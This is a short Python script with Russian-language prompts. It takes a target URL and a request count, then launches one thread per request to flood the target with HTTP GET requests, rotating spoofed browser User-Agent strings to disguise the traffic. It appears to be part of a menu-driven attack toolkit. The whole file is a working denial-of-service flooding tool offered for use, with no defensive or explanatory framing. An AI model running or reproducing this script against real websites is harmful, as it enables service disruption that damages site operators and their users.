import random
import threading
import requests
import os

s = 0
url = input("[?] URL -> ")
num_requests = int(input("[?] Введите количество запросов -> "))
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
]

def send_request(i):
    user_agent = random.choice(user_agents)
    headers = {"User-Agent": user_agent}
    try:
        response = requests.get(url, headers=headers)
        print(f"[+] Request {i} sent successfully\n")
    except:
        print(f"[-] Request {i} failed\n")

threads = []
for i in range(1, num_requests + 1):
    t = threading.Thread(target=send_request, args=[i])
    t.start()
    threads.append(t)

for t in threads:
    t.join()

back = input("[?] Вернуться в главное меню? Yes/No -> ")

if back.lower() == "yes":
    os.system("clear")
    os.system("python main.py")
elif back.lower() == "no":
    print("Хорошо, вы не вернетесь в главное меню")